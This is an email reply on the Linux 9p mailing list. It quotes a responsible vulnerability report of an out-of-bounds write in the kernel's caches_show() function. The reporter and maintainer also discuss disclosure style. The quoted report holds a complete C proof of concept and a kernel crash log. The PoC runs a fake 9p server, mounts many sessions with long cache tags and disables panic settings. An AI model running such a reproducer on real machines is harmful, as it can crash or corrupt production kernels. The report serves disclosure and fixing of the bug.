Received: from mail-qt1-f178.google.com (mail-qt1-f178.google.com [209.85.160.178])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 5327D30C172
	for <v9fs@lists.linux.dev>; Tue, 23 Jun 2026 16:19:55 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=pass smtp.client-ip=209.85.160.178
ARC-Seal:i=2; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1782231597; cv=pass; b=V1RfabacO6baWpOvUuoIabw79yynugIlgyBXhBOE6MnJreVlFXY6s6rBpU8HXB5ioCkSrXrQpiOFgl9fKshanVzu3sD5poiSQhg79Cmp9mDK9qVbmYLhx3UWz/bbnpieCogRGMXGk4YLCWm3APn8o8VHuY5IP1q7ToYWOicZksw=
ARC-Message-Signature:i=2; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1782231597; c=relaxed/simple;
	bh=JzeW6p4laQiKgTOO6SuhdsWeu6Jq7bLEmpfPKFX/Fr4=;
	h=MIME-Version:References:In-Reply-To:From:Date:Message-ID:Subject:
	 To:Cc:Content-Type; b=AiVom3qi8dDmpdbk7CB3LF+VOaYa1nssBL17vW/F1F/hOHc0bweB4XFzJLGMkKP1FlkLlUVYz2fWV8fNKkEjwbVpB2zDBI15V1uwuNiGNkbsBSdEkojZ19R4huuGAvZh8hK+A5HdGU3jZ2Np9N4KIbt5Z9GKBcBSJmwuhexX+T8=
ARC-Authentication-Results:i=2; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com; spf=pass smtp.mailfrom=gmail.com; dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b=AzgoNK52; arc=pass smtp.client-ip=209.85.160.178
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=gmail.com
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b="AzgoNK52"
Received: by mail-qt1-f178.google.com with SMTP id d75a77b69052e-517b1f2c6adso51925641cf.2
        for <v9fs@lists.linux.dev>; Tue, 23 Jun 2026 09:19:55 -0700 (PDT)
ARC-Seal: i=1; a=rsa-sha256; t=1782231594; cv=none;
        d=google.com; s=arc-20240605;
        b=APFKR2OV0Krk/oqv/FrJHpF9rAGOW2ST+nR3M4+KqWnPSuF/DZXSqEGqhmvLeY2T6B
         mcTywvzcAn/yOD/oRXIt9G3lcbkoIdsxZZxwgjC9q6PQJHHUDOS2mqAHYiItVJ8F3wjn
         GyF5p162gHkN2rPg/UlmMrURhvyBV5RTO2nG41GH4VsfSflQuNPVynrjIJWhp3ddBubQ
         /SVnGtGLTk4b4F+Z3LbUH3i6dmRGAs0/yLZ56EzYz9Szt58XS5wa8OGiD1mMxjUSVKSP
         norSk8J4rK3X0nS4VfUfovX16DQ9Hs2X+p550SoULyFlToeXhFWtJNJNShaKpG++4fIA
         lkQQ==
ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=google.com; s=arc-20240605;
        h=content-transfer-encoding:cc:to:subject:message-id:date:from
         :in-reply-to:references:mime-version:dkim-signature;
        bh=aZrCK3QYcpTk79+VrUvEYz0QeHAI9TUi81GfKFNnjro=;
        fh=b19THbNbDzpGSViUoTWLcTPkLbzfUWJhoVCB7sAQwtU=;
        b=YJJPA1og6Q05frJhCllGIudCPbSwzxDVky+rmRoG5GpReNsvtA9Mca+gSmCk/wc8ce
         3AxK4PQgDrsIkk0YSN1tN0TRJD2Muwi5h6mIQZrXRXj1XCGFcR8Xrqh9WdHminHd31jP
         ACqLiRcrGVEFN2uagE5O8IvLPnspR+a9wvAMCyiZQ6QN0Y/SqkTRbjqoQ4+dO84KpqHN
         K1Bl91PkQorgrs+pkKzckDwYk4/zoMSkwWlO2T2ZwLijSJN6uZNkLpB7RfhQXHEQpEdY
         2FxKyQdPRM5/Uk1GdBw7IgZIBigvsSynVkx1eWHU4JQI+6IUdBvf/i0/6PjHtfEfSJPJ
         LaQw==;
        darn=lists.linux.dev
ARC-Authentication-Results: i=1; mx.google.com; arc=none
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20251104; t=1782231594; x=1782836394; darn=lists.linux.dev;
        h=content-transfer-encoding:cc:to:subject:message-id:date:from
         :in-reply-to:references:mime-version:from:to:cc:subject:date
         :message-id:reply-to;
        bh=aZrCK3QYcpTk79+VrUvEYz0QeHAI9TUi81GfKFNnjro=;
        b=AzgoNK526tSBhqwLHyuFUeXgNNowZ+87Ur04drKTWbfEF2dVAnLJE8UYbI9lk6cozt
         2iyIOdp5BFkyOIGLBMzaIjA1i5pp10cGKdP0nz1H58YebwEWhx1sQyK5HHXlG+dtUmfy
         y5VNXe4EyWdAyn1wkby3YIAq2XrmXBdzgHElrAt23/3fylcmxret/XNUlcoisRr19CYE
         8IsZM47BJwbBMl1jVa+QJAUGdojr8MZJlIsTeaRAwJoD2qgxLJPkNGCLyPFILyhPC1JT
         P79lcWgC8DKkeRGZa6Md80ZZ8YPfLfcz/dXW6v609Art1nwH6hEK46626FvXYUMsgql7
         NFzQ==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20251104; t=1782231594; x=1782836394;
        h=content-transfer-encoding:cc:to:subject:message-id:date:from
         :in-reply-to:references:mime-version:x-gm-gg:x-gm-message-state:from
         :to:cc:subject:date:message-id:reply-to;
        bh=aZrCK3QYcpTk79+VrUvEYz0QeHAI9TUi81GfKFNnjro=;
        b=LqwJzs6Kpa+5NpDLCZHGVcVDXfqTgSI0nIjTe30vsMukddoWTWFohYLkUm3azeXmwT
         E6Dbd1uMfBDK9UIpVo1H8WmpEVfkgIQ/YAcDYpTzHLseN/3mtWmuSeTfplspjJLNj6h6
         SW8jAluOYisXR9uG/dlV7GE68VsrCN3en/drW9d4/8lKZBlUyVMtWjVoqUB0qIfZgDgA
         vp8RPtNfR8oG5mGkQPvduv/Wh5XNlxLUBKJuNsdmSrX2DlxpJFA2HrDg8b/eK+o1q+Pj
         ud4fRfPZl3xyDo+T+RbvN0qqalYKQjrN7r34EDs+VbnIuao7RWCUWdgPMEUxme0aSs3V
         6ngw==
X-Forwarded-Encrypted: i=1; AFNElJ+YJx+I1m6Zyp+uLTi1CbNfeSQs1gqYATV45e63ihT1Fg2m7caU7pfjfNpG74fqF4/rNvIb@lists.linux.dev
X-Gm-Message-State: AOJu0YzJcLp5FgjKfdTIcOQIoaQwdeDzkD+kozwImv+yPz5KAnFZU2Hb
	HTNQd8EbCce3fMvEN56E9hZOPCsS6VhktdoxgNFqa2vjZucRugVR9+CBw8xLP8urSdKTT4SNj0K
	DjRlUBNYU9zoIluhRuIu6WR5jbF4Z9mk=
X-Gm-Gg: AfdE7cn9rj7Jyi2Xex90AvUOeYnuPA7e5RjPV2iIHf21bHfhbZQyTcRPBbPqi8e341t
	DCq6Z7gBowFeHdU6GOCSqILcSYXbP9MYLL86OGAoVUpSAljNDAwS/RV2tcR+5y1zo45FV562vu8
	O+twKlj2jUCNkTRVvd7oGFPH4KDHMFQx9B+Cm+dvo/uJH74OADhkCCM52a63kt7tYN13c4SOxpW
	KNp1j1ekBh8QiQC/r+7jyZwVZZrLVQp688M+1wgP+dAeAqU/bC9AChKM+b6Kum1wYS5e0zrIRRn
	Q4Rp/KycmAZ+xRTePPXDuUZ+WKv4sA==
X-Received: by 2002:a05:622a:191f:b0:517:79f0:ae3d with SMTP id
 d75a77b69052e-51a5473239fmr46772881cf.21.1782231593930; Tue, 23 Jun 2026
 09:19:53 -0700 (PDT)
Precedence: bulk
X-Mailing-List: v9fs@lists.linux.dev
List-Id: <v9fs.lists.linux.dev>
List-Subscribe: <mailto:v9fs+subscribe@lists.linux.dev>
List-Unsubscribe: <mailto:v9fs+unsubscribe@lists.linux.dev>
MIME-Version: 1.0
References: <cover.1781908090.git.zzhan461@ucr.edu> <ajcRMMkrOyaKyv0n@codewreck.org>
In-Reply-To: <ajcRMMkrOyaKyv0n@codewreck.org>
From: Yuan Tan <yuantan098@gmail.com>
Date: Tue, 23 Jun 2026 09:19:40 -0700
X-Gm-Features: AVVi8CeG1F6-kKO2j5dw0hLZuytKRwATiJI1EhkWkOJI-oiMq7tOK0Z7HNC69Iw
Message-ID: <CAPuPA7Lhb=vUfJRd9dbBhhTomjSvyb88Mrp7x_KqbcWFsi_EvQ@mail.gmail.com>
Subject: Re: [PATCH 0/1] 9p: caches_show() out-of-bounds write
To: Dominique Martinet <asmadeus@codewreck.org>
Cc: Ren Wei <n05ec@lzu.edu.cn>, ericvh@kernel.org, lucho@ionkov.net, 
	linux_oss@crudebyte.com, rpembry@gmail.com, zcliangcn@gmail.com, 
	bird@lzu.edu.cn, zzhan461@ucr.edu, v9fs@lists.linux.dev
Content-Type: text/plain; charset="UTF-8"
Content-Transfer-Encoding: quoted-printable

On Sat, Jun 20, 2026 at 3:16=E2=80=AFPM Dominique Martinet
<asmadeus@codewreck.org> wrote:
>
> Ren Wei wrote on Sat, Jun 20, 2026 at 11:53:02PM +0800:
> > From: Zhao Zhang <zzhan461@ucr.edu>
> >
> > Hi Linux kernel maintainers,
>
> There's no reason not to send that to the list (it requires privileges
> as you said), so quoting in full with v9fs@ in cc
>
> (I see you also sent a patch, I don't consider this a priority so will
> look at it more closely after the merge window; there's another similar
> fix for the v9fs tag show being discussed right now)

Thank you for looping in the list.

We were a bit unsure about the preferred disclosure style here: some
maintainers prefer that PoCs and vulnerability details are not sent to
public lists, while others prefer to see the PoC when reviewing the
issue. Because of that, our current approach has been to send the
cover letter only to the relevant maintainers, while keeping the patch
itself public.

Thanks a lot for taking the time to review the patch. There is no
urgency from our side, so looking at it after the merge window sounds
perfectly fine.

>
> > We found an issue in fs/9p/v9fs.c.
> > The bug is reachable by a privileged user with permission to mount 9p f=
ilesystems.
> > The relevant details are provided below.
> >
> > ---- details below ----
> >
> > Bug details:
> >
> > The bug is in `caches_show()` for `/sys/fs/9p/caches`.
> >
> > That function iterates the global 9p session list and appends each
> > session's `cachetag` into the sysfs buffer with:
> >
> > `snprintf(buf + count, limit, "%s\n", v9ses->cachetag)`
> >
> > It then advances:
> >
> > `count +=3D n;`
> > `limit -=3D n;`
> >
> > This is incorrect because `snprintf()` returns the full would-have-been
> > length, not the number of bytes actually stored. Once the accumulated
> > cache-tag output exceeds `PAGE_SIZE`, `count` advances past the end of
> > the sysfs buffer and `limit` becomes negative.
> >
> > A later iteration then passes an out-of-bounds destination pointer and =
a
> > large `size_t` converted from the negative `limit` into `snprintf()`,
> > leading to an out-of-bounds write in the sysfs show path.
> >
> > In practice this is reachable when `CONFIG_9P_FSCACHE` is enabled and a
> > privileged user mounts enough 9p instances with long `cachetag=3D` valu=
es
> > before reading `/sys/fs/9p/caches`.
> >
> > Reproducer:
> >
> > cc -x c -O2 -static -o mini_poc.bin mini_poc
> > ./mini_poc.bin
> >
> >
> > We run the PoC in a 2 vCPU, 2 GB RAM x86 QEMU environment.
> >
> > ------BEGIN PoC------
> >
> > #define _GNU_SOURCE
> >
> > #include <arpa/inet.h>
> > #include <errno.h>
> > #include <fcntl.h>
> > #include <signal.h>
> > #include <stdint.h>
> > #include <stdio.h>
> > #include <stdlib.h>
> > #include <string.h>
> > #include <sys/mount.h>
> > #include <sys/socket.h>
> > #include <sys/stat.h>
> > #include <sys/types.h>
> > #include <sys/wait.h>
> > #include <time.h>
> > #include <unistd.h>
> >
> > #define PORT 5640
> > #define MOUNTS 19
> > #define TAG_FILL 211
> >
> > enum {
> >       P9_RLERROR =3D 7,
> >       P9_TGETATTR =3D 24,
> >       P9_RGETATTR =3D 25,
> >       P9_TVERSION =3D 100,
> >       P9_RVERSION =3D 101,
> >       P9_TATTACH =3D 104,
> >       P9_RATTACH =3D 105,
> >       P9_TFLUSH =3D 108,
> >       P9_RFLUSH =3D 109,
> >       P9_TCLUNK =3D 120,
> >       P9_RCLUNK =3D 121,
> > };
> >
> > static const char version_str[] =3D "9P2000.L";
> > static const uint64_t p9_stats_mask =3D 0x7ffULL | 0x1000ULL;
> >
> > static void put_le16(unsigned char *p, uint16_t v)
> > {
> >       p[0] =3D v & 0xff;
> >       p[1] =3D (v >> 8) & 0xff;
> > }
> >
> > static void put_le32(unsigned char *p, uint32_t v)
> > {
> >       p[0] =3D v & 0xff;
> >       p[1] =3D (v >> 8) & 0xff;
> >       p[2] =3D (v >> 16) & 0xff;
> >       p[3] =3D (v >> 24) & 0xff;
> > }
> >
> > static void put_le64(unsigned char *p, uint64_t v)
> > {
> >       put_le32(p, (uint32_t)v);
> >       put_le32(p + 4, (uint32_t)(v >> 32));
> > }
> >
> > static uint16_t get_le16(const unsigned char *p)
> > {
> >       return (uint16_t)p[0] | ((uint16_t)p[1] << 8);
> > }
> >
> > static uint32_t get_le32(const unsigned char *p)
> > {
> >       return (uint32_t)p[0] |
> >              ((uint32_t)p[1] << 8) |
> >              ((uint32_t)p[2] << 16) |
> >              ((uint32_t)p[3] << 24);
> > }
> >
> > static ssize_t read_full(int fd, void *buf, size_t len)
> > {
> >       size_t off =3D 0;
> >
> >       while (off < len) {
> >               ssize_t ret =3D read(fd, (char *)buf + off, len - off);
> >
> >               if (ret =3D=3D 0)
> >                       return off;
> >               if (ret < 0) {
> >                       if (errno =3D=3D EINTR)
> >                               continue;
> >                       return -1;
> >               }
> >               off +=3D ret;
> >       }
> >
> >       return off;
> > }
> >
> > static int write_full(int fd, const void *buf, size_t len)
> > {
> >       size_t off =3D 0;
> >
> >       while (off < len) {
> >               ssize_t ret =3D write(fd, (const char *)buf + off, len - =
off);
> >
> >               if (ret < 0) {
> >                       if (errno =3D=3D EINTR)
> >                               continue;
> >                       return -1;
> >               }
> >               off +=3D ret;
> >       }
> >
> >       return 0;
> > }
> >
> > static int send_reply(int fd, uint8_t type, uint16_t tag,
> >                     const void *payload, uint32_t payload_len)
> > {
> >       unsigned char hdr[7];
> >
> >       put_le32(hdr, 7 + payload_len);
> >       hdr[4] =3D type;
> >       put_le16(hdr + 5, tag);
> >       if (write_full(fd, hdr, sizeof(hdr)) < 0)
> >               return -1;
> >       if (payload_len && write_full(fd, payload, payload_len) < 0)
> >               return -1;
> >       return 0;
> > }
> >
> > static int send_lerror(int fd, uint16_t tag, uint32_t err)
> > {
> >       unsigned char payload[4];
> >
> >       put_le32(payload, err);
> >       return send_reply(fd, P9_RLERROR, tag, payload, sizeof(payload));
> > }
> >
> > static int handle_client(int fd)
> > {
> >       static const unsigned char root_qid[13] =3D {
> >               0x80, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00,
> >               0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
> >       };
> >
> >       for (;;) {
> >               unsigned char hdr[7];
> >               unsigned char payload[8192];
> >               uint32_t size;
> >               uint8_t type;
> >               uint16_t tag;
> >
> >               if (read_full(fd, hdr, sizeof(hdr)) !=3D sizeof(hdr))
> >                       return 0;
> >
> >               size =3D get_le32(hdr);
> >               type =3D hdr[4];
> >               tag =3D get_le16(hdr + 5);
> >               if (size < sizeof(hdr) || size - sizeof(hdr) > sizeof(pay=
load))
> >                       return -1;
> >               if (read_full(fd, payload, size - sizeof(hdr)) !=3D
> >                   (ssize_t)(size - sizeof(hdr)))
> >                       return -1;
> >
> >               switch (type) {
> >               case P9_TVERSION: {
> >                       unsigned char out[4 + 2 + sizeof(version_str) - 1=
];
> >                       uint32_t msize =3D 8192;
> >
> >                       if (size >=3D 11)
> >                               msize =3D get_le32(payload);
> >                       put_le32(out, msize);
> >                       put_le16(out + 4, sizeof(version_str) - 1);
> >                       memcpy(out + 6, version_str, sizeof(version_str) =
- 1);
> >                       if (send_reply(fd, P9_RVERSION, tag, out, sizeof(=
out)) < 0)
> >                               return -1;
> >                       break;
> >               }
> >               case P9_TATTACH:
> >                       if (send_reply(fd, P9_RATTACH, tag,
> >                                      root_qid, sizeof(root_qid)) < 0)
> >                               return -1;
> >                       break;
> >               case P9_TGETATTR: {
> >                       unsigned char out[153];
> >                       uint64_t now =3D (uint64_t)time(NULL);
> >                       uint64_t vals[] =3D {
> >                               2, 0, 0, 4096, 0,
> >                               now, 0, now, 0, now, 0, now, 0, 1, 1,
> >                       };
> >                       size_t off =3D 0;
> >                       size_t i;
> >
> >                       memset(out, 0, sizeof(out));
> >                       put_le64(out + off, p9_stats_mask);
> >                       off +=3D 8;
> >                       memcpy(out + off, root_qid, sizeof(root_qid));
> >                       off +=3D sizeof(root_qid);
> >                       put_le32(out + off, 040755);
> >                       off +=3D 4;
> >                       put_le32(out + off, 0);
> >                       off +=3D 4;
> >                       put_le32(out + off, 0);
> >                       off +=3D 4;
> >                       for (i =3D 0; i < sizeof(vals) / sizeof(vals[0]);=
 i++) {
> >                               put_le64(out + off, vals[i]);
> >                               off +=3D 8;
> >                       }
> >                       if (send_reply(fd, P9_RGETATTR, tag, out, sizeof(=
out)) < 0)
> >                               return -1;
> >                       break;
> >               }
> >               case P9_TCLUNK:
> >                       send_reply(fd, P9_RCLUNK, tag, NULL, 0);
> >                       return 0;
> >               case P9_TFLUSH:
> >                       if (send_reply(fd, P9_RFLUSH, tag, NULL, 0) < 0)
> >                               return -1;
> >                       break;
> >               default:
> >                       if (send_lerror(fd, tag, 95) < 0)
> >                               return -1;
> >                       break;
> >               }
> >       }
> > }
> >
> > static void server_loop(void)
> > {
> >       struct sockaddr_in addr;
> >       int one =3D 1;
> >       int listen_fd;
> >
> >       listen_fd =3D socket(AF_INET, SOCK_STREAM, 0);
> >       if (listen_fd < 0)
> >               _exit(1);
> >       setsockopt(listen_fd, SOL_SOCKET, SO_REUSEADDR, &one, sizeof(one)=
);
> >
> >       memset(&addr, 0, sizeof(addr));
> >       addr.sin_family =3D AF_INET;
> >       addr.sin_port =3D htons(PORT);
> >       addr.sin_addr.s_addr =3D htonl(INADDR_LOOPBACK);
> >       if (bind(listen_fd, (struct sockaddr *)&addr, sizeof(addr)) < 0)
> >               _exit(1);
> >       if (listen(listen_fd, 16) < 0)
> >               _exit(1);
> >
> >       for (;;) {
> >               int client_fd =3D accept(listen_fd, NULL, NULL);
> >
> >               if (client_fd < 0) {
> >                       if (errno =3D=3D EINTR)
> >                               continue;
> >                       _exit(1);
> >               }
> >               handle_client(client_fd);
> >               close(client_fd);
> >       }
> > }
> >
> > static int write_text(const char *path, const char *text)
> > {
> >       int fd =3D open(path, O_WRONLY);
> >       size_t len =3D strlen(text);
> >
> >       if (fd < 0)
> >               return -1;
> >       if (write_full(fd, text, len) < 0) {
> >               close(fd);
> >               return -1;
> >       }
> >       close(fd);
> >       return 0;
> > }
> >
> > static void cleanup_mounts(const char *base)
> > {
> >       char mp[128];
> >       int i;
> >
> >       for (i =3D 1; i <=3D MOUNTS; i++) {
> >               snprintf(mp, sizeof(mp), "%s/mnt.%d", base, i);
> >               umount2(mp, MNT_DETACH);
> >       }
> > }
> >
> > static int mount_sessions(const char *base)
> > {
> >       char mp[128];
> >       char tag[4 + TAG_FILL + 1];
> >       char opts[512];
> >       int i;
> >
> >       for (i =3D 1; i <=3D MOUNTS; i++) {
> >               snprintf(mp, sizeof(mp), "%s/mnt.%d", base, i);
> >               mkdir(mp, 0755);
> >               snprintf(tag, sizeof(tag), "%03d_", i);
> >               memset(tag + 4, 'A', TAG_FILL);
> >               tag[sizeof(tag) - 1] =3D '\0';
> >               snprintf(opts, sizeof(opts),
> >                        "trans=3Dtcp,port=3D%d,version=3D9p2000.L,cache=
=3Dfscache,cachetag=3D%s",
> >                        PORT, tag);
> >               if (mount("127.0.0.1", mp, "9p", 0, opts) < 0) {
> >                       perror("mount");
> >                       return -1;
> >               }
> >       }
> >
> >       return 0;
> > }
> >
> > static int dump_caches(void)
> > {
> >       char buf[4096];
> >       int fd;
> >
> >       fd =3D open("/sys/fs/9p/caches", O_RDONLY);
> >       if (fd < 0) {
> >               perror("open");
> >               return -1;
> >       }
> >
> >       for (;;) {
> >               ssize_t ret =3D read(fd, buf, sizeof(buf));
> >
> >               if (ret =3D=3D 0)
> >                       break;
> >               if (ret < 0) {
> >                       perror("read");
> >                       close(fd);
> >                       return -1;
> >               }
> >               if (write_full(STDOUT_FILENO, buf, ret) < 0) {
> >                       close(fd);
> >                       return -1;
> >               }
> >       }
> >
> >       close(fd);
> >       return 0;
> > }
> >
> > int main(void)
> > {
> >       const char *base =3D "/tmp/v9fs-caches-poc";
> >       pid_t child;
> >       int status =3D 1;
> >
> >       if (geteuid() !=3D 0) {
> >               fprintf(stderr, "run as root\n");
> >               return 1;
> >       }
> >
> >       mkdir(base, 0755);
> >       cleanup_mounts(base);
> >       write_text("/proc/sys/kernel/panic_on_warn", "0\n");
> >       write_text("/proc/sys/kernel/panic_on_oops", "0\n");
> >
> >       child =3D fork();
> >       if (child < 0) {
> >               perror("fork");
> >               return 1;
> >       }
> >       if (child =3D=3D 0)
> >               server_loop();
> >
> >       sleep(1);
> >       if (mount_sessions(base) =3D=3D 0 && dump_caches() =3D=3D 0)
> >               status =3D 0;
> >
> >       cleanup_mounts(base);
> >       kill(child, SIGTERM);
> >       waitpid(child, NULL, 0);
> >       return status;
> > }
> >
> >
> > ------END PoC--------
> >
> > ----BEGIN crash log----
> >
> > [  312.177878][T10660] Kernel panic - not syncing: kernel: panic_on_war=
n set ...
> > [  312.178459][T10660] CPU: 0 UID: 0 PID: 10660 Comm: cat Not tainted 7=
.0.0-08308-g9e1e9d660255 #1 PREEMPT(full)
> > [  312.181692][T10660]  check_panic_on_warn+0x61/0x80
> > [  312.182076][T10660]  __warn+0xe8/0x330
> > [  312.189425][T10660] RIP: 0010:vsnprintf+0xbfb/0x1180
> > [  312.192016][T10660] RDX: 1ff400000138ef52 RSI: ffffffffffffff4d RDI:=
 ff1100006f9850b3
> > [  312.195689][T10660]  snprintf+0xaa/0xe0
> > [  312.197121][T10660]  caches_show+0x79/0xe0
> > [  312.197845][T10660]  sysfs_kf_seq_show+0x1bd/0x380
> > [  312.198611][T10660]  seq_read_iter+0x40f/0x11f0
> > [  312.200066][T10660]  vfs_read+0x6cd/0xb70
> > [  312.203264][T10660]  ksys_read+0xf9/0x1d0
> > [  312.204639][T10660]  do_syscall_64+0x116/0xf80
> > [  312.205311][T10660]  entry_SYSCALL_64_after_hwframe+0x77/0x7f
> >
> >
> > -----END crash log-----
> >
> > Best regards,
> > Zhao Zhang
> >
> >
> > Zhao Zhang (1):
> >   9p: v9fs: fix caches_show() out-of-bounds write
> >
> >  fs/9p/v9fs.c | 16 +++++-----------
> >  1 file changed, 5 insertions(+), 11 deletions(-)
> >
>
> --
> Dominique Martinet | Asmadeus
